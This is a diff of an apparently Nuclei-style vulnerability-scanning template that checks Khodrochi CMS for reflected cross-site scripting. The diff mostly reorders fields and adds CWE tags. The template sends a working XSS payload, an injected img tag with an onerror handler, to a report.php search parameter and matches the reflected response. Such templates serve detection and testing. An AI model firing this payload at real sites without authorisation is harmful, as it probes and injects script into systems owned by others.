@@ -1,5 +1,4 @@
 id: khodrochi-cms-xss
-
 info:
   name: Khodrochi CMS - Cross Site Scripting
   author: r3Y3r53
@@ -9,21 +8,22 @@ info:
   reference:
     - https://www.exploitalert.com/view-details.html?id=38723
     - https://cxsecurity.com/ascii/WLB-2022050087
+  classification:
+    cwe-id:
+      - CWE-79
+      - CWE-83
   metadata:
-    verified: true
     max-request: 1
-  tags: khodrochi,cms,xss,vuln
-
+    verified: true
+  tags: cms,khodrochi,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/specification/report.php?q=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E"
-
-    matchers:
-      - type: dsl
+  - matchers:
+      - condition: and
         dsl:
-          - 'status_code == 200'
-          - 'contains(header, "text/html")'
-          - 'contains(body, "class=\"cons_form") && contains(body, "><img src=x onerror=prompt(document.domain)>")'
-        condition: and
-
+          - status_code == 200
+          - contains(header, "text/html")
+          - contains(body, "class=\"cons_form") && contains(body, "><img src=x onerror=prompt(document.domain)>")
+        type: dsl
+    method: GET
+    path:
+      - '{{BaseURL}}/specification/report.php?q=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E'
